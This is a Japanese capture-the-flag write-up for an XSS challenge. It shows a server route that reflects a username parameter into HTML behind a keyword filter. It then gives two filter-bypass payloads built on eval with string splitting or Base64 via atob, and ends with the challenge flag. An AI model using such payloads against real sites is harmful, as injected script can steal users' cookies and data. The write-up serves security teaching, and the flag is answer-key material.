# Alert my Flag

[English](./README.md)

## 説明

`alert(flag)`が実行できたら勝ち！

## Writeup

### 概要

この問題の目標は、XSS を使って `alert(flag)` と等価な JavaScript を実行し、その後 "Submit this page!" ボタンを押すことです。

まず、トップページの描画処理を見ます。

```javascript
app.get("/", async (req, res) => {

  const flag = req.cookies.flag ?? "fake_flag";

  const username = req.query.username ?? "guest";

  let result;
  if(username.includes("flag") || username.includes("alert")) {
    result = "<p>invalid input</p>";
  } else {
    result = `<h1>Hello ${username}!</h1>`
  }

  const html = `<!DOCTYPE html>
<html>
<head>
  <script>const flag="${flag}";</script>
</head>
<body>
  ${result}
  ...
</body>
</html>`;
  return res.send(html);
});
```

`username` クエリパラメータがそのまま HTML に埋め込まれているため、XSS が可能です。

ただし、`<script>alert(flag)</script>` を直接使う方法は、次のフィルタにより失敗します。

```javascript
if(username.includes("flag") || username.includes("alert")) {
  result = "<p>invalid input</p>";
}
```

### 解法

このフィルタは様々な方法で回避できます。分かりやすい方法の一つは、文字列を実行できる `eval` を使うことです。

```javascript
eval('ale'+'rt(fl'+'ag)')
```

もう一つは `eval` と `atob` を組み合わせる方法です。`atob` は Base64 をデコードします。

```javascript
eval(atob('YWxlcnQoZmxhZyk='))
```

後者はこの問題ではやややりすぎですが、より厳しいフィルタの回避や、長く複雑な JavaScript を送りたいときに有効なので覚えておくと良いです。

## フラグ

`Alpaca{n0w_c4n_U_send_fl4g_t0_ur_s3rver_d1rectly?}`
